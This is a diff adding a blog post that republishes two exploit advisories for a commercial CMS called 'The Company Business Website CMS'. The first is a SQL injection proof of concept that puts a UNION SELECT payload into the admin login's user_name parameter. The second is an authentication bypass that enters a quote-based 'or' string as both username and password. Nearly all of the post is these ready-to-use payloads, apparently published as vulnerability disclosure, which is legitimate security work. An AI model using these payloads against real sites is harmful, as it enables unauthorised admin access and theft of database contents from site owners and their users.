@@ -1,0 +1,39 @@
+---
+layout:     post
+title:      "The Company Business Website CMS - Multiple Vulnerabilities"
+date:       2019-03-21 12:01
+author:     "Ahmet Ümit BAYRAM"
+category:   exploit
+tags:       [sql, sqli, sql injection, exploit-db]
+---
+# Exploit Title: The Company Business Website CMS - 'user_name' SQL
+Injection
+# Date: 20.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.codester.com/items/6806/the-company-business-website-cms
+# Demo Site: http://thecompany.morkocbilisim.com
+# Version: Lastest
+# Tested on: Kali Linux
+# CVE: N/A
+
+----- PoC: SQLi -----
+
+Request: http://localhost/[PATH]/admin/production/login.php
+Vulnerable Parameter: user_name (POST)
+Payload: user_name=VNfn' UNION ALL SELECT
+NULL,NULL,NULL,CONCAT(CONCAT('qqkxq','mOiFXJaJzzATyiPlJyQgwuuTiDddtckLMPRRRdEH'),'qjbbq'),NULL,NULL,NULL,NULL--
+WMfV&user_password=&loggin=Psop
+
+
+# Exploit Title: The Company Business Website CMS - Authentication Bypass
+# Date: 20.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.codester.com/items/6806/the-company-business-website-cms
+# Demo Site: http://thecompany.morkocbilisim.com
+# Version: Lastest
+# Tested on: Kali Linux
+# CVE: N/A
+----- PoC: Authentication Bypass -----
+Administration Panel: http://localhost/[PATH]/admin/production/login.php
+Username: '=' 'or'
+Password: '=' 'or'
